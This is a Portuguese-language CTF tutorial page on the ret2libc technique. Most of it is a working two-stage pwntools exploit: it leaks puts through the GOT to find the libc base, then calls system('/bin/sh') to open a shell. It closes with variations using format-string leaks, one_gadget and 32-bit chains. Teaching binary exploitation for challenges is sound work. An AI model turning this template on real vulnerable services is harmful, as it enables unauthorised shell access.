---
title: "ret2libc"
sidebar_position: 7
---

Quando o binário não tem `system` nem `/bin/sh`, usamos os da libc. Precisamos da **base da libc** (ASLR muda a cada execução, mas os offsets dentro da libc são fixos). Teoria em [ret2libc](../../../pwning/stack/rop/ret2libc.mdx).

Pré-requisitos: controle do return address ([ROP](./rop.md)), um jeito de **vazar** um endereço da libc e um jeito de **voltar** para a função vulnerável depois do leak (ou um leak antes do overflow).

## Receita em 2 estágios

```py
from pwn import *
elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')               # a libc do servidor (fornecida pelo desafio; use pwninit para rodar local)
p = process()
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Estágio 1: puts(puts@got) imprime o endereço real de puts, e voltamos para main
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendlineafter(b'> ', payload)         # ajuste o prompt
leak = u64(p.recvline().strip().ljust(8, b'\0'))
libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Estágio 2: system("/bin/sh")
payload  = b'A' * offset
payload += p64(ret)                      # alinhamento
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'> ', payload)
p.interactive()
```

A base calculada sempre termina em `000`. Se não terminar, o offset ou a libc estão errados.

## Variações

- **Outros leaks**: format string (`%p`) com um endereço da libc, leitura fora de array, UAF na heap, `printf`/`write` de um buffer sem terminador. Qualquer endereço da libc serve: `libc.address = leak - libc.sym['nome']` (ou `- offset` medido no GDB com `vmmap`).
- **Sem a libc do desafio**: identifique pela terminação do leak (3 últimos dígitos) em [libc.rip](https://libc.rip) ou com `libc-database`.
- **one_gadget**: `one_gadget libc.so.6` dá endereços que abrem shell sem argumentos (exigem certas condições nos registradores, como `rsi == 0` ou `[rsp+0x40] == 0`). Útil quando só cabe um endereço no payload. Teste todos.
- **Sem `pop rdi` no binário**: depois do leak, use os gadgets da própria libc (`ROP(libc)`).
- **x86 (32 bits)**: `[puts@plt][main][puts@got]` para o leak e `[system][exit][bin_sh]` para o shell, sem gadgets.

Com ASLR **desligado** (local): `ldd ./vuln` dá a base, e `libc.address = base`.
